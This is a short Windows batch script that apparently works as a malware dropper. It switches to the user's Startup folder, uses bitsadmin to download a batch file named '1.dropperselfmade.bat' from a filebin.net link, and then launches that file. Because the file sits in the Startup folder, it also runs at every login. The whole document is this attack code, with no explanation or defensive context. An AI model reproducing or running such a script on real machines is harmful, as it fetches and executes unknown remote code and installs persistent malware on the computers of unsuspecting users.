@echo off
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
bitsadmin /transfer update /download /priority FOREGROUND "https://filebin.net/l3kfdq5x46zv0ous/1.dropperselfmade.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\1.dropperselfmade.bat"

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
start 1.dropperselfmade.bat